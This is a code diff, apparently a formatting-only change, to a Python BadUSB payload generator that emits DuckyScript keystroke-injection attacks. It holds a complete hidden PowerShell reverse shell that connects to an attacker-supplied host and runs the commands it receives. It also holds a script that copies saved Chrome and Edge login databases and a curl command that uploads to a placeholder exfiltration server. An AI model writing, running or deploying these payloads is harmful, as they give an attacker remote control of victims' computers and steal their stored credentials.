@@ -22,21 +22,19 @@ class BadUSBGenerator:
             "macos": self._macos_payloads(),
         }
 
-    def generate_powershell_reverse_shell(
-        self, lhost: str, lport: int, delay: int = 500
-    ) -> str:
+    def generate_powershell_reverse_shell(self, lhost: str, lport: int, delay: int = 500) -> str:
         """Generate DuckyScript for PowerShell reverse shell delivery"""
         ps_cmd = (
-            f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc '
+            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
             f'$client=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
-            f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
-            f'while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;'
-            f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
-            f'$sendback=(iex $data 2>&1 | Out-String );'
+            f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
+            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;"
+            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
+            f"$sendback=(iex $data 2>&1 | Out-String );"
             f'$sendback2=$sendback + "PS " + (pwd).Path + "> ";'
-            f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
-            f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};'
-            f'$client.Close()'
+            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
+            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
+            f"$client.Close()"
         )
         return self._wrap_ducky(
             [
@@ -122,25 +120,25 @@ class BadUSBGenerator:
         """Generate DuckyScript to dump browser credentials"""
         script_path = "$env:TEMP\\d.ps1"
         ps_script = (
-            '$files = @(); '
+            "$files = @(); "
             '$paths = @("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",'
             '"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"); '
-            'foreach ($p in $paths) { if (Test-Path $p) { '
+            "foreach ($p in $paths) { if (Test-Path $p) { "
             '$files += @{path=$p; dest="$env:TEMP\\" + [IO.Path]::GetFileName($p)}; '
-            'Copy-Item $p $files[-1][\"dest\"] } }; '
-            'Write-Output ($files | ConvertTo-Json)'
+            'Copy-Item $p $files[-1]["dest"] } }; '
+            "Write-Output ($files | ConvertTo-Json)"
         )
         return self._wrap_ducky(
             [
                 "DELAY 500",
                 "GUI r",
                 "DELAY 500",
-                f"STRING powershell -NoP -NonI -Exec Bypass -c \"{ps_script}\"",
+                f'STRING powershell -NoP -NonI -Exec Bypass -c "{ps_script}"',
                 "ENTER",
                 "DELAY 2000",
                 "GUI r",
                 "DELAY 500",
-                "STRING cmd /c curl -F \"file=@%TEMP%\\d.ps1\" http://PAYLOAD_SERVER/exfil",
+                'STRING cmd /c curl -F "file=@%TEMP%\\d.ps1" http://PAYLOAD_SERVER/exfil',
                 "ENTER",
             ],
             "windows",
